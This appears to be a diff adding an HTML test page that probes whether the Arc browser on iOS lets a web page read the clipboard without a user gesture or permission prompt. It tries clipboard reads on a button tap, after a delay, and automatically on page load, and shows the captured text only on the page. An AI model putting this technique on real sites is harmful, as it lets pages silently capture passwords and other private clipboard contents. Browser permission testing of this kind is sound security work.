@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Clipboard Read Without Gesture</title>
+<style>
+body{font-family:-apple-system,sans-serif;max-width:480px;margin:0 auto;padding:24px 16px;background:#fff;color:#1d1d1f}
+h2{font-size:18px;margin-bottom:8px}
+p{font-size:14px;color:#666;line-height:1.5;margin-bottom:16px}
+button{display:block;width:100%;padding:16px;background:#007aff;color:#fff;border:none;border-radius:12px;font-size:17px;font-weight:600;cursor:pointer;margin-bottom:10px}
+button:active{opacity:.7}
+#out{background:#f5f5f7;border-radius:8px;padding:14px;font-size:13px;font-family:ui-monospace,monospace;color:#333;white-space:pre-wrap;word-break:break-all;min-height:40px;margin-top:12px}
+</style>
+</head>
+<body>
+<h2>Clipboard Access Test</h2>
+<p>Copy something sensitive (like a password) to your clipboard, then tap below. Tests whether Arc allows clipboard read without the iOS paste banner / permission prompt.</p>
+
+<button onclick="readClip()">Click me — read clipboard</button>
+<button onclick="autoRead()" style="background:#ff9500">Auto-read on page load (no gesture)</button>
+<div id="out">results appear here</div>
+
+<script>
+function log(m){document.getElementById('out').textContent+=m+'\n'}
+
+function readClip(){
+  log('--- gesture-triggered read ---');
+  try{
+    navigator.clipboard.readText().then(function(t){
+      log('clipboard.readText: "'+t.substring(0,100)+'"');
+      log('⚠ Got clipboard WITHOUT iOS paste banner?');
+    }).catch(function(e){log('readText err: '+e.message)});
+  }catch(e){log('API err: '+e.message)}
+
+  try{
+    navigator.clipboard.read().then(function(items){
+      log('clipboard.read: '+items.length+' items');
+      items.forEach(function(item){log('  types: '+item.types.join(', '))});
+    }).catch(function(e){log('read err: '+e.message)});
+  }catch(e){log('read API err: '+e.message)}
+
+  try{
+    document.execCommand('paste');
+    log('execCommand paste attempted');
+  }catch(e){log('execCommand err: '+e.message)}
+}
+
+function autoRead(){
+  log('--- auto-read (no gesture) ---');
+  setTimeout(function(){
+    try{
+      navigator.clipboard.readText().then(function(t){
+        log('AUTO clipboard: "'+t.substring(0,100)+'"');
+        log('⚠ CRITICAL — read clipboard without ANY user gesture');
+      }).catch(function(e){log('auto err: '+e.message)});
+    }catch(e){log('auto API err: '+e.message)}
+  },100);
+}
+
+window.addEventListener('load',function(){
+  log('page loaded');
+  try{
+    navigator.clipboard.readText().then(function(t){
+      log('⚠ ON-LOAD clipboard: "'+t.substring(0,100)+'"');
+    }).catch(function(e){log('onload err: '+e.message)});
+  }catch(e){log('onload API err: '+e.message)}
+});
+</script>
+</body>
+</html>
